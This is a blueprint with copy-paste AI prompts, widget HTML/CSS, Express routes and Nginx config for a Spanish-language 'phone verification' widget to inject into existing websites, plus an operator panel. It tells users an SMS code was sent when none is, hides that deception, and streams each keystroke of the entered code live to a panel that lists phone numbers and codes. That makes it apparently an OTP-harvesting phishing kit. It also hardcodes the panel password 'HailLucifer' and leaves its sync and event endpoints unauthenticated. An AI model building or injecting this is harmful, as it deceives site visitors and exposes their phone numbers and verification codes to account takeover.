# 🛡️ Real-Time Phone Verification & Admin Traceability Feature Blueprint
> Complete implementation guide, architecture specs, and plug-and-play AI prompts to replicate or **inject this exact feature into any EXISTING web application** without breaking existing code, styles, or routing.

---

## 📋 Table of Contents
1. [🤖 Master AI Prompt: Injection into an EXISTING Web App](#-master-ai-prompt-injection-into-an-existing-web-app)
2. [🤖 Master AI Prompt: Building from Scratch (New Project)](#-master-ai-prompt-building-from-scratch)
3. [🔌 Drop-in Widget Architecture for Existing Websites](#-drop-in-widget-architecture-for-existing-websites)
   - [CSS Isolation & Namespace Strategy (`vx-*`)](#css-isolation--namespace-strategy)
   - [HTML Embed Snippet (Paste anywhere in existing pages)](#html-embed-snippet)
4. [⚙️ Backend Integration Options (Express, Next.js, PHP, or Standalone)](#️-backend-integration-options)
   - [Option A: Express.js / Node.js Existing Server (Middleware Routes)](#option-a-expressjs--nodejs-existing-server)
   - [Option B: Standalone Sidecar Service (For PHP, Python, Ruby, Laravel, WordPress)](#option-b-standalone-sidecar-service)
   - [Option C: Next.js App Router (Route Handlers)](#option-c-nextjs-app-router)
5. [🛡️ Standalone Admin Panel (`panel.html`)](#️-standalone-admin-panel)
6. [🧩 Step-by-Step Integration Checklist](#-step-by-step-integration-checklist)
7. [🚀 VPS & Production Deployment with Reverse Proxy](#-vps--production-deployment-with-reverse-proxy)

---

## 🤖 Master AI Prompt: Injection into an EXISTING Web App
*(Copy and paste this prompt when you have an already working web application and want to add this feature smoothly).*

````markdown
I have an existing web application and I want to seamlessly integrate a real-time phone registration, verification, and live admin traceability system into it.

IMPORTANT: Do NOT overwrite, refactor, or break my existing website layout, design, navbar, or routes. Integrate this feature as a modular, self-contained drop-in system.

Here are the exact requirements to inject into my existing project:

1. Client-Facing Verification Widget (Drop-in):
   - Embeddable inside my existing page (or as a dedicated step/modal) with isolated, prefixed CSS (`vx-*`) so it does not conflict with my existing stylesheets (Bootstrap, Tailwind, custom CSS, etc.).
   - Step 1: User enters their 10-digit phone number.
   - On submit: Cryptographically generates an AES-256-GCM cipher envelope and a 6-character alphanumeric confirmation code (hashed via SHA-256 for validation).
   - Seamlessly flips to Step 2 without page reload.
   - Shows an authentic, clean confirmation message: "SMS verification code sent to +52 [phone]. Enter the 6-character code below to verify your account." (Do NOT display test boxes, code spoilers, or simulation badges on the client page).
   - Step 2: User enters the 6-character code. As the user types each character (`input` event), the keystroke is captured live in real time and transmitted to the backend/admin panel.
   - On valid code submit: Marks status as "VERIFICADO" and triggers a customizable callback `onVerificationSuccess(record)` so my existing app can proceed (e.g. unlock checkout, proceed to dashboard, redirect, or save to database).
   - Includes a "Resend Code" button that renews the code and updates the active trace.

2. Dedicated Admin Control Portal (`panel.html`):
   - A separate, standalone admin page that does not interfere with the client site.
   - Protected by an authentication gate: Accepts authorized admin emails ending with a specific domain (e.g., `@proton.me`) and a password (e.g., `HailLucifer`).
   - Seamless Token Handover: When an admin logs in, passes `?session=` in URL query so opening the panel never prompts for login a second time. Include an "✕" minimize/close button on the login gate.
   - Real-Time Traceability Matrix Table:
     a) ID Registro / Trace ID.
     b) Requesting Phone Number (full number, e.g., +52 55 1234 5678).
     c) Assigned Alphanumeric Code (the code they must enter), with a 1-click "Copy Code" button.
     d) Live User Keystrokes (displays in real time what the user is typing on the public page, highlighted in green when it matches).
     e) Encrypted envelope (AES-256-GCM cipher payload).
     f) Status badge: Pending, Incorrect Code, or Verified.
     g) Control Action: A manual "Aprove / Verify" button to allow the operator to verify the user from the panel.
   - Live Event Audit Feed: Stream showing real-time event cards (SMS requested, live keystrokes, verification, operator approvals).
   - KPI counters: Total numbers registered, pending, verified, total trace events.
   - Export encrypted database to JSON and Clear panel buttons.

3. Testing Mode (Without SMS Provider):
   - Works immediately out of the box without paying or connecting an external SMS provider (Twilio, AWS SNS, etc.).
   - The business team sees the requesting phone number and the exact generated code on the Admin Panel in real time.

4. Multi-Tier Real-Time Synchronization Engine:
   - Provide the backend endpoints `/api/events` (SSE) and `/api/sync` (REST) compatible with my existing backend stack (or provide a lightweight micro-service / Express middleware).
   - Uses local JSON disk persistence (`data_store.json`) so registered numbers survive server restarts.
   - Multi-tier sync: Server-Sent Events (SSE) + BroadcastChannel + window.postMessage + fallback polling.

Please provide the modular code, prefixed styles, and integration instructions to drop this into my existing codebase cleanly.
````

---

## 🤖 Master AI Prompt: Building from Scratch
*(Use this prompt if you are starting a brand new project from scratch).*

````markdown
I am building a new logistics/e-commerce web application from scratch and need to integrate a real-time phone registration, verification, and live admin traceability system with testing simulation mode.

Features required:
1. Public client registration flow: 10-digit phone -> 6-char alphanumeric SMS verification code. Real-time keystroke tracking (`input` event) sent to backend.
2. Authentic production messages: "SMS verification code sent to +52 [phone]". No visible simulation boxes or code spoilers for the client.
3. Standalone Admin Panel (`panel.html`): Real-time matrix table showing Requesting Phone Number, Assigned Code (with 1-click Copy button), Live Keystrokes, Encrypted Envelope (AES-256-GCM), and Manual Approve button.
4. Protected admin login gate: Domain validation (@proton.me) + password (HailLucifer). Seamless token handover via `?session=...` URL parameter to avoid double login.
5. Real-Time Sync Engine: Zero-dependency Node.js server (`server.js`) with Server-Sent Events (`/api/events`), REST sync (`/api/sync`), disk persistence (`data_store.json`), BroadcastChannel, and postMessage.
6. VPS Ready: PM2 ecosystem config, Dockerfile, and Nginx reverse proxy with `proxy_buffering off;`.
````

---

## 🔌 Drop-in Widget Architecture for Existing Websites

When adding this feature to an existing website, use the **Isolated Widget Pattern**. Everything is namespaced under `vx-*` so it never alters your existing CSS or DOM.

### CSS Isolation & Namespace Strategy
Add this self-contained CSS block to your existing stylesheet or include it as `<link rel="stylesheet" href="vx-verification.css">`:

```css
/* ============================================================================
   Namespaced Drop-in Verification Widget (vx-*)
   ============================================================================ */
.vx-widget-container {
  max-width: 580px;
  margin: 0 auto;
  background: #ffffff;
  border-radius: 16px;
  padding: 32px 28px;
  box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
  border: 1px solid #e2e8f0;
  font-family: system-ui, -apple-system, sans-serif;
  color: #1e293b;
  box-sizing: border-box;
}

.vx-widget-container * {
  box-sizing: border-box;
}

.vx-badge-row {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 16px;
  flex-wrap: wrap;
  gap: 8px;
}

.vx-pill {
  font-size: 0.75rem;
  font-weight: 700;
  padding: 4px 10px;
  border-radius: 999px;
  background: #f1f5f9;
  color: #475569;
}

.vx-pill-security {
  background: #ecfdf5;
  color: #059669;
  border: 1px solid #a7f3d0;
}

.vx-title {
  font-size: 1.4rem;
  font-weight: 800;
  margin-bottom: 8px;
  color: #0f172a;
}

.vx-subtitle {
  font-size: 0.9rem;
  color: #64748b;
  margin-bottom: 24px;
  line-height: 1.5;
}

.vx-form-group {
  margin-bottom: 18px;
}

.vx-label {
  display: block;
  font-size: 0.8rem;
  font-weight: 700;
  color: #334155;
  margin-bottom: 6px;
  text-transform: uppercase;
  letter-spacing: 0.04em;
}

.vx-phone-input-wrap {
  display: flex;
  align-items: center;
  border: 2px solid #cbd5e1;
  border-radius: 10px;
  overflow: hidden;
  background: #ffffff;
  transition: border-color 0.2s;
}

.vx-phone-input-wrap:focus-within {
  border-color: #2563eb;
}

.vx-prefix {
  background: #f8fafc;
  padding: 12px 14px;
  font-size: 0.95rem;
  font-weight: 700;
  color: #334155;
  border-right: 1px solid #cbd5e1;
}

.vx-input {
  width: 100%;
  border: none;
  padding: 12px 14px;
  font-size: 1.05rem;
  outline: none;
  color: #0f172a;
}

.vx-code-input {
  width: 100%;
  text-align: center;
  font-family: monospace;
  font-size: 1.7rem;
  letter-spacing: 0.35em;
  font-weight: 800;
  text-transform: uppercase;
  border: 2px solid #cbd5e1;
  border-radius: 10px;
  padding: 12px;
  color: #0f172a;
  outline: none;
  transition: border-color 0.2s;
}

.vx-code-input:focus {
  border-color: #2563eb;
}

.vx-btn-submit {
  width: 100%;
  background: #2563eb;
  color: #ffffff;
  border: none;
  border-radius: 10px;
  padding: 14px;
  font-size: 1rem;
  font-weight: 700;
  cursor: pointer;
  transition: background 0.2s;
}

.vx-btn-submit:hover {
  background: #1d4ed8;
}

.vx-btn-resend {
  width: 100%;
  background: transparent;
  color: #475569;
  border: 1px solid #cbd5e1;
  border-radius: 10px;
  padding: 10px;
  font-size: 0.9rem;
  font-weight: 600;
  cursor: pointer;
  margin-top: 10px;
  transition: all 0.2s;
}

.vx-btn-resend:hover {
  background: #f1f5f9;
  color: #0f172a;
}

.vx-msg-box {
  margin-top: 18px;
  padding: 14px 16px;
  border-radius: 10px;
  background: #f8fafc;
  border: 1px solid #e2e8f0;
  border-left: 4px solid #2563eb;
  font-size: 0.9rem;
  line-height: 1.45;
}

.vx-msg-success {
  border-left-color: #16a34a;
  background: #f0fdf4;
}

.vx-hidden {
  display: none !important;
}
```

---

### HTML Embed Snippet
Paste this block anywhere inside your existing HTML or template (e.g. inside a checkout step, onboarding modal, or profile settings):

```html
<!-- Drop-in Phone Verification Widget -->
<div class="vx-widget-container" id="vxVerificationWidget">
  <div class="vx-badge-row">
    <span class="vx-pill">VERIFICACIÓN OBLIGATORIA</span>
    <span class="vx-pill vx-pill-security">🔒 Cifrado AES-256-GCM</span>
  </div>

  <h3 class="vx-title">Validación Telefónica de Seguridad</h3>
  <p class="vx-subtitle">Registra tu número celular para verificar tu cuenta y continuar operando de forma segura.</p>

  <!-- Step 1: Phone Registration Form -->
  <form id="vxPhoneForm">
    <div class="vx-form-group">
      <label class="vx-label" for="vxPhoneInput">Número Celular (10 dígitos)</label>
      <div class="vx-phone-input-wrap">
        <span class="vx-prefix">🇲🇽 +52</span>
        <input type="tel" id="vxPhoneInput" class="vx-input" placeholder="55 1234 5678" maxlength="10" required />
      </div>
    </div>
    <button type="submit" class="vx-btn-submit">Registrar y Recibir Código SMS →</button>
  </form>

  <!-- Step 2: Code Confirmation Form -->
  <form id="vxCodeForm" class="vx-hidden">
    <div class="vx-form-group">
      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px;">
        <span style="font-size:0.85rem; color:#475569;">Número: <strong id="vxDisplayPhone"></strong></span>
        <button type="button" id="vxChangePhoneBtn" style="background:none;border:none;color:#2563eb;cursor:pointer;font-size:0.82rem;font-weight:600;">Cambiar número</button>
      </div>
      <label class="vx-label" for="vxCodeInput">Código Alfanumérico (6 caracteres)</label>
      <input type="text" id="vxCodeInput" class="vx-code-input" placeholder="••••••" maxlength="6" autocomplete="one-time-code" required />
    </div>
    <button type="submit" class="vx-btn-submit">✓ Confirmar Código y Continuar</button>
    <button type="button" class="vx-btn-resend" id="vxResendBtn">🔄 Reenviar código SMS</button>
  </form>

  <!-- Notice and Feedback Box -->
  <div id="vxMsgBox" class="vx-msg-box vx-hidden"></div>
</div>
```

---

## ⚙️ Backend Integration Options

You can implement the real-time backend in whatever stack your existing web app already uses:

### Option A: Express.js / Node.js Existing Server
If your existing app is Node/Express, add these lightweight routes to your existing `app.js` or `server.js`:

```javascript
// Add to your existing Express app:
const fs = require('fs');
const path = require('path');
const DB_FILE = path.join(__dirname, 'data_store.json');

let sharedDb = fs.existsSync(DB_FILE) ? JSON.parse(fs.readFileSync(DB_FILE, 'utf-8')).db || [] : [];
let sharedLogs = fs.existsSync(DB_FILE) ? JSON.parse(fs.readFileSync(DB_FILE, 'utf-8')).logs || [] : [];
let sseClients = [];

function persist() {
  fs.writeFileSync(DB_FILE, JSON.stringify({ db: sharedDb, logs: sharedLogs }, null, 2));
}

function broadcastSSE(data) {
  const payload = `data: ${JSON.stringify(data)}\n\n`;
  sseClients.forEach((c) => { try { c.res.write(payload); } catch {} });
}

// 1. SSE Stream for Real-time Admin Monitoring
app.get('/api/events', (req, res) => {
  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive'
  });
  res.write('retry: 1000\n\n');
  const id = Date.now();
  sseClients.push({ id, res });
  res.write(`data: ${JSON.stringify({ type: 'SNAPSHOT', db: sharedDb, logs: sharedLogs })}\n\n`);
  req.on('close', () => { sseClients = sseClients.filter((c) => c.id !== id); });
});

// 2. REST Sync Endpoint for Registrations & Keystrokes
app.get('/api/sync', (req, res) => res.json({ db: sharedDb, logs: sharedLogs }));

app.post('/api/sync', express.json(), (req, res) => {
  const { action, db, logs, regId, input } = req.body;
  if (action === 'UPDATE_DB' && Array.isArray(db)) sharedDb = db;
  if (action === 'LIVE_INPUT') {
    const rec = sharedDb.find((r) => r.id === regId);
    if (rec) rec.liveUserInput = input;
  }
  if (action === 'CLEAR_ALL') { sharedDb = []; sharedLogs = []; }
  persist();
  broadcastSSE({ type: 'UPDATE', action, db: sharedDb, logs: sharedLogs, regId, input });
  res.json({ success: true });
});
```

---

### Option B: Standalone Sidecar Service (PHP, Laravel, Python, Ruby, WordPress)
If your existing app is in PHP, Python, or WordPress, you **do not need to modify your backend code at all**:
1. Run the lightweight `server.js` as an independent service on port `3000`.
2. Configure Nginx to forward `/api/sync`, `/api/events`, and `/panel.html` to port 3000:
   ```nginx
   # Add this block inside your existing website's Nginx configuration:
   location /api/ {
       proxy_pass http://127.0.0.1:3000;
       proxy_buffering off;
       proxy_set_header Connection '';
       chunked_transfer_encoding on;
   }
   location /panel.html {
       proxy_pass http://127.0.0.1:3000;
   }
   ```
3. Your existing site handles PHP/Python as usual, while the verification widget and admin panel communicate with the sidecar!

---

### Option C: Next.js App Router
Create two route handlers in your Next.js project:
1. `app/api/events/route.js`:
   ```javascript
   export const dynamic = 'force-dynamic';
   export async function GET() {
     // Return ReadableStream with SSE headers
   }
   ```
2. `app/api/sync/route.js`:
   ```javascript
   export async function POST(req) {
     const body = await req.json();
     // Update memory/store and return Response.json({ success: true })
   }
   ```

---

## 🛡️ Standalone Admin Panel (`panel.html`)

Keep `panel.html` as a standalone file in your web root (or served at `/admin/traceability`):
* It connects to `/api/events` and `/api/sync`.
* Features the complete traceability matrix:
  - Full phone number.
  - Assigned code with 1-click `📋 Copiar`.
  - Live user keystrokes (`.live-match` green highlight when matching).
  - Manual "Aprobar / Verificar" button.
* Auth Gate:
  - Accepts any `@proton.me` email.
  - Password: `HailLucifer` (or your configured secret).
  - Seamless token handover via `?session=...` URL parameter to avoid double login.
  - Has an `✕` button to minimize/close the login gate at any time.

---

## 🧩 Step-by-Step Integration Checklist

Follow this checklist whenever integrating into an existing website:

1. **Paste Widget HTML**: Put the `<div class="vx-widget-container">` snippet wherever user verification is required on your site.
2. **Include Prefixed CSS**: Add the `vx-*` CSS snippet into your global CSS file or link it as `<link rel="stylesheet" href="vx-verification.css">`.
3. **Include Client JS**: Link `client-sync.js` (or import the `initVxVerification()` function).
4. **Define Success Callback**: Hook the success event to your existing app flow:
   ```javascript
   // Hook into your existing frontend logic:
   window.onVxVerificationSuccess = function(record) {
     console.log('Usuario verificado:', record.phone);
     // Examples:
     // - Proceed to checkout step 2
     // - Enable submit button on your main form
     // - Redirect: window.location.href = '/dashboard';
   };
   ```
5. **Mount Backend Endpoints**: Add `/api/events` and `/api/sync` into your existing backend, or run `server.js` on port 3000.
6. **Deploy `panel.html`**: Place `panel.html` and `panel.js` in your public directory.
7. **Nginx SSE Config**: Ensure `proxy_buffering off;` is set in your Nginx config.

---

## 🚀 VPS & Production Deployment with Reverse Proxy

```nginx
server {
    listen 80;
    server_name tu-dominio.com;

    # Tu web existente (ej. PHP, React, Next.js, Node):
    location / {
        proxy_pass http://127.0.0.1:3000; # o tu backend actual
    }

    # Bloque OBLIGATORIO para el tiempo real del widget y panel:
    location /api/events {
        proxy_pass http://127.0.0.1:3000/api/events;
        proxy_http_version 1.1;
        proxy_buffering off;         # Clave para transmitir teclas en tiempo real
        proxy_cache off;
        proxy_set_header Connection '';
        chunked_transfer_encoding on;
        proxy_read_timeout 86400s;
    }
}
```
